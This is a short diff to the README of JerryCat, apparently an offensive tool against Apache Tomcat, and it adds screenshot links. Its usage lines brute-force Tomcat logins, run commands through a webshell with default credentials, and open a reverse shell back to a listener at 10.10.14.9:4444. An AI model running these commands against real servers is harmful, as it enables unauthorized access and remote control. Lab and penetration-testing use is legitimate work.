@@ -37,6 +37,8 @@ python3 jerrycat.py brute http://10.10.10.95:8080/ -P wordlists/password-list-co
 ```sh
 python3 jerrycat.py brute http://10.10.10.95:8080/ -U /path/to/user/list -P wordlists/password-list-common-tomcat.txt
 ```
+![brute_1](https://github.com/TheF0rceAwak5ns/JerryCat/assets/117742366/57a83800-6b2a-4d16-96ea-8b3ff469fffd)
+
 
 ## Usage - Authenticated attack
 
@@ -44,10 +46,14 @@ python3 jerrycat.py brute http://10.10.10.95:8080/ -U /path/to/user/list -P word
 ```sh
 python3 jerrycat.py exec http://10.10.10.95:8080/ -u tomcat -p s3cret
 ```
+![webshell](https://github.com/TheF0rceAwak5ns/JerryCat/assets/117742366/4588a9bb-f2ca-4a45-ac26-75cd1ee956d0)
 
 ### Reverse shell
 ```sh
 python3 jerrycat.py reverse http://10.10.10.95:8080/ -u tomcat -p s3cret --lhost 10.10.14.9 --lport 4444
 ```
+![reverse_1](https://github.com/TheF0rceAwak5ns/JerryCat/assets/117742366/5436ff31-6996-4a43-a055-00fce23bac64)
+
+
 
 
